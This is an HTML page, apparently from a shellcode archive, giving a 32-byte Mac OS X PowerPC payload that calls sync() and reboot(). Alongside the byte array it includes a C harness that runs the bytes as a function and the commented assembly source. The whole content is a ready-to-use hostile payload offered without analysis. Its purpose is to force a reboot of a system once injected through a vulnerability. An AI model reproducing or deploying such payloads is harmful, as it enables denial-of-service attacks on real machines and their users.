<html><head><title>Osx/ppc - sync(), reboot() - 32 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * [MacOSX/PowerPC]
 * Shellcode for: sync(), reboot()
 * 32 bytes
 * hophet [at] gmail.com
 * http://www.nlabs.com.br/~hophet/
 *
 */

#include &quot;stdio.h&quot;
#include &quot;string.h&quot;

char shellcode[] = 

&quot;\x7c\x63\x1a\x79&quot;
&quot;\x39\x40\x01\x06&quot;
&quot;\x38\x0a\xff\x1e&quot;
&quot;\x44\xff\xff\x02&quot;
&quot;\x60\x60\x60\x60&quot;
&quot;\x39\x40\x01\x19&quot;
&quot;\x38\x0a\xff\x1e&quot;
&quot;\x44\xff\xff\x02&quot;;

int main() {

	void (*p)();
	p = (void *)&amp;shellcode;
	printf(&quot;Lenght: %d\n&quot;, strlen(shellcode));
	p();
}

/*
.globl _main
.text
_main:
	xor.	r3, r3,r3	// r3 = NULL
	li	r10, 226+36
	addi	r0, r10, -226	// r0 = 36
	.long	0x44ffff02	// sc opcode
	.long	0x60606060	// NOP
	li	r10, 226+55
	addi	r0, r10, -226	// r0 = 55
	.long	0x44ffff02	// sc opcode 
*/



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
